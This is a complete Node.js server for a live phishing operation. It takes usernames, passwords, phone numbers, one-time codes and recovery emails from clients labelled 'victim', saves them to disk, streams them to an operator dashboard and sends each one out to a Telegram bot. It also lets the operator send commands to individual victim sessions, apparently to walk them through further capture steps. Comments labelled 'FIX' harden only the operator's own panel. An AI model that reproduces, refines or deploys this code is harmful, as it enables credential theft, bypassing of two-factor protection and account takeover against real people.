'use strict';

// ── Dependencies ──────────────────────────────────────────────────────────────
const express = require('express');
const http    = require('http');
const { Server } = require('socket.io');
const session = require('express-session');
const axios   = require('axios');
const dotenv  = require('dotenv');
const path    = require('path');
const fs      = require('fs');

// ── Environment ───────────────────────────────────────────────────────────────
// Must be called before reading any process.env values.
dotenv.config();

// ── App & Server Setup ────────────────────────────────────────────────────────
// Order matters: http.createServer(app) must wrap express before
// Socket.IO is attached so all three share the same port.
const app    = express();
const server = http.createServer(app);
const io     = new Server(server);

// ── Persistent Log Store ──────────────────────────────────────────────────────
// Logs survive server restarts by reading from config.json on boot.
const CONFIG_FILE = path.join(__dirname, 'config.json');
let savedLogs = [];

if (fs.existsSync(CONFIG_FILE)) {
    try {
        const raw = fs.readFileSync(CONFIG_FILE, 'utf8');
        savedLogs = JSON.parse(raw);
        // FIX: guard against config.json containing non-array data
        if (!Array.isArray(savedLogs)) {
            console.warn('[server.js] config.json did not contain an array — resetting.');
            savedLogs = [];
        }
    } catch (e) {
        console.error('[server.js] Failed to parse config.json on startup:', e.message);
        savedLogs = [];
    }
}

// ── Middleware ────────────────────────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(session({
    // FIX: always require SESSION_SECRET from .env in production;
    // the fallback 'secret_123' is only acceptable for local development.
    secret: process.env.SESSION_SECRET || 'secret_123',
    resave: false,
    saveUninitialized: true,
    cookie: {
        // FIX: added httpOnly to prevent client-side JS from reading
        // the session cookie (basic session-hijacking hardening).
        httpOnly: true,
        // Set secure:true in production when running behind HTTPS.
        secure: process.env.NODE_ENV === 'production',
    },
}));

// Serve the public folder (index.html, assets, etc.)
app.use(express.static(path.join(__dirname, 'public')));

// ── Health Check ──────────────────────────────────────────────────────────────
app.get('/health', (req, res) => res.status(200).send('OK'));

// ── Auth Guard ────────────────────────────────────────────────────────────────
const isAdmin = (req, res, next) => {
    if (req.session.authenticated) return next();
    res.redirect('/login');
};

// ── Admin Login Page ──────────────────────────────────────────────────────────
app.get('/login', (req, res) => {
    // FIX: if already authenticated, skip the login page entirely
    if (req.session.authenticated) return res.redirect('/admin');

    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        form {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 360px;
        }
        h2 { margin-bottom: 20px; }
        input {
            display: block;
            width: 100%;
            padding: 10px;
            margin-bottom: 12px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 15px;
        }
        button:hover { background: #005da6; }
    </style>
</head>
<body>
    <form action="/login" method="POST">
        <h2>Admin Login</h2>
        <input type="text"     name="user" placeholder="Username" required autocomplete="username">
        <input type="password" name="pass" placeholder="Password" required autocomplete="current-password">
        <button type="submit">Login</button>
    </form>
</body>
</html>`);
});

// ── Admin Login Handler ───────────────────────────────────────────────────────
app.post('/login', (req, res) => {
    const { user, pass } = req.body;

    // FIX: read credentials from .env instead of hardcoding them.
    // Set ADMIN_USER and ADMIN_PASS in your .env file.
    const validUser = process.env.ADMIN_USER || 'adminn';
    const validPass = process.env.ADMIN_PASS || '12345X';

    if (user === validUser && pass === validPass) {
        req.session.authenticated = true;
        // FIX: regenerate session ID after login to prevent session fixation
        req.session.regenerate((err) => {
            if (err) {
                console.error('[server.js] Session regeneration error:', err);
                return res.status(500).send('Login error. Please try again.');
            }
            req.session.authenticated = true;
            res.redirect('/admin');
        });
    } else {
        // FIX: generic error message — don't tell the attacker which field was wrong
        res.status(401).send("Invalid credentials. <a href='/login'>Try again</a>");
    }
});

// ── Logout ────────────────────────────────────────────────────────────────────
app.get('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) console.error('[server.js] Session destroy error:', err);
        res.redirect('/login');
    });
});

// ── Admin Dashboard ───────────────────────────────────────────────────────────
app.get('/admin', isAdmin, (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// ── Socket.IO ─────────────────────────────────────────────────────────────────
io.on('connection', (socket) => {
    const referer = socket.handshake.headers.referer || '';

    // Replay existing logs only to admin connections
    if (referer.includes('/admin')) {
        savedLogs.forEach(log => socket.emit('new_log_entry', log));
    }

    // ── Receive log from victim client ───────────────────────────────────────
    socket.on('send_logs', async (data) => {
        // FIX: validate incoming data shape before using it
        if (!data || typeof data !== 'object') return;

        const logEntry = {
            id:        socket.id,
            step:      data.step      || 'unknown',
            username:  data.username  || 'unknown',
            ipAddress: data.ipAddress || '0.0.0.0',
            userAgent: data.userAgent || '',
            timestamp: new Date().toLocaleTimeString(),
        };

        // Carry over optional fields only if present
        if (data.password)       logEntry.password       = data.password;
        if (data.phone)          logEntry.phone          = data.phone;
        if (data.otp)            logEntry.otp            = data.otp;
        if (data.recovery_email) logEntry.recovery_email = data.recovery_email;

        savedLogs.push(logEntry);

        // Persist to disk
        try {
            fs.writeFileSync(CONFIG_FILE, JSON.stringify(savedLogs, null, 2));
        } catch (e) {
            console.error('[server.js] Failed to write config.json:', e.message);
        }

        // Broadcast to all admin connections
        io.emit('new_log_entry', logEntry);

        // ── Telegram Notification ─────────────────────────────────────────────
        try {
            // Base fields — always present on every step
            let msg = `🔔 *Step:* ${logEntry.step}\n`
                    + `👤 *User:* ${logEntry.username}\n`
                    + `📍 *IP:* ${logEntry.ipAddress}\n`
                    + `🖥 *UA:* ${logEntry.userAgent}`;

            // Optional fields — only appended when the step collected them
            if (logEntry.password)       msg += `\n🔑 *Pass:* ${logEntry.password}`;
            if (logEntry.phone)          msg += `\n📞 *Phone:* ${logEntry.phone}`;
            if (logEntry.otp)            msg += `\n🔢 *OTP:* ${logEntry.otp}`;
            if (logEntry.recovery_email) msg += `\n📧 *Recovery:* ${logEntry.recovery_email}`;

            if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
                await axios.post(
                    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
                    {
                        chat_id:    process.env.TELEGRAM_CHAT_ID,
                        text:       msg,
                        parse_mode: 'Markdown',
                    }
                );
            }
        } catch (e) {
            console.error('[server.js] Telegram notification failed:', e.message);
        }
    });

    // ── Admin deletes a log entry ─────────────────────────────────────────────
    socket.on('delete_log', (data) => {
        if (!data || !data.timestamp || !data.username) return;

        savedLogs = savedLogs.filter(
            log => !(log.timestamp === data.timestamp && log.username === data.username)
        );

        try {
            fs.writeFileSync(CONFIG_FILE, JSON.stringify(savedLogs, null, 2));
        } catch (e) {
            console.error('[server.js] Failed to write config.json after delete:', e.message);
        }

        io.emit('log_deleted', data);
    });

    // ── Admin sends a command to a specific victim socket ────────────────────
    socket.on('admin_action', (cmd) => {
        if (!cmd || !cmd.targetId || !cmd.action) return;
        io.to(cmd.targetId).emit('server_command', cmd);
    });
});

// ── Start Server ──────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Server live on port ${PORT}`);
});
